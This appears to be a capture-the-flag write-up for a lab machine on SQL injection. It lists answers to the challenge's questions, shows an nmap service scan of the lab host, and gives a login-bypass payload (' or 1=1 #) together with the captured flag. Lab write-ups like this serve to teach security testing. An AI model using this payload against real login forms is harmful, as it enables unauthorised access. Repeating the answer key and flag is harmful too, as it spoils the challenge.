# Target Info
Target Machine IP = 10.129.13.158

# Solution
1. Structured Query Language
2. SQL Injection
3. Personally Identifiable INformation
4. A03:2021-Injection
5. run nmapon port 80, Apache httpd 2.4.38 ((Debian))
```
± sudo nmap -p 80 -sV 10.129.13.158
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 21:09 WIB
Nmap scan report for 10.129.13.158
Host is up (0.52s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.18 seconds
```
6. 443
7. directory
8. 404
9. dir
10. #
11. Congratulations
12. get the flag with this sqli query
```
username : ' or 1=1 #
password : random
```
Result:
![image](https://github.com/ilhamhanifan/hackerman/assets/53177896/bc52bf68-1498-4775-8edc-8c0652a81a8b)


flag = e3d0796d002a446c0e622226f42e9672
